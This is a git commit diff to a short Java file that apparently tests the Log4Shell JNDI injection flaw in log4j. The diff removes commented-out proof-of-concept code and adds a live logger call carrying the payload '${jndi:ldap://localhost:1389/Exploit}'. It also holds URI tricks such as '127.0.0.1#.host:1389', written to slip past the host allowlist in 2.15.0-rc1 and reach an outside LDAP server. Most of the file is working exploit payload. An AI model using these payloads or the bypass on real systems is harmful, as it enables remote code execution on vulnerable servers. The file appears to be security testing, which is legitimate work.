498a81bbf161bdddfbaac64cfc373f40fa04a760
w4nd3r-0 <xc17857906094@163.com>
2021-12-21 17:29:48 +0800

    update

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -19,39 +19,10 @@ import java.net.UnknownHostException;
 
 public class log4j {
 
-
+    private static final Logger logger = LogManager.getLogger(log4j.class);
     public static void main(String[] args) throws UnknownHostException, URISyntaxException {
-        // log4j-2.15.0-rc1
-//        final Configuration config = new DefaultConfigurationBuilder().build(true);
-//        final MessagePatternConverter converter =
-//                MessagePatternConverter.newInstance(config, new String[] {"lookups"});
-//        final Message msg = new ParameterizedMessage("${jndi:rmi://localhost:1099/ Exploit}");
-//        final LogEvent event = Log4jLogEvent.newBuilder()
-//                .setLoggerName("MyLogger")
-//                .setLevel(Level.DEBUG)
-//                .setMessage(msg).build();
-//        final StringBuilder sb = new StringBuilder();
-//        converter.format(event, sb);
-//        System.out.println(sb);
-        // log4j-2.14.0
-
-        System.setProperty("log4j2.enableJndi", "true");
-        final Logger logger = LogManager.getLogger(log4j.class);
-         logger.error("${jndi:ldap://localhost:1389/Exploit}");
-//                final LogEvent event = Log4jLogEvent.newBuilder()
-//                .setLoggerName("MyLogger")
-//                .setLevel(Level.DEBUG)
-//                .setMessage(new ParameterizedMessage("${bundle:app:flag}")).build();
-//        ResourceBundleLookup resourceBundleLookup = new ResourceBundleLookup();
-//        resourceBundleLookup.lookup(event,"app:flag");
-//        URI uri1 = new URI("ldap://127.0.0.1#@4ra1n.love:1389/badClassName");
-//        System.out.println(uri1.getHost());
-//
-//        URI uri2 = new URI("ldap://127.0.0.1#4ra1n.love:1389/badClassName");
-//        System.out.println(uri2.getHost());
-//
-//        URI uri3 = new URI("ldap://127.0.0.1#.4ra1n.love:1389/badClassName");
-//        System.out.println(uri3.getHost());
+        logger.error("${jndi:ldap://localhost:1389/Exploit}");
+//        logger.error("${jndi:ldap://127.0.0.1#.w4nder.top:1389/Exploit}");
     }
 
 }
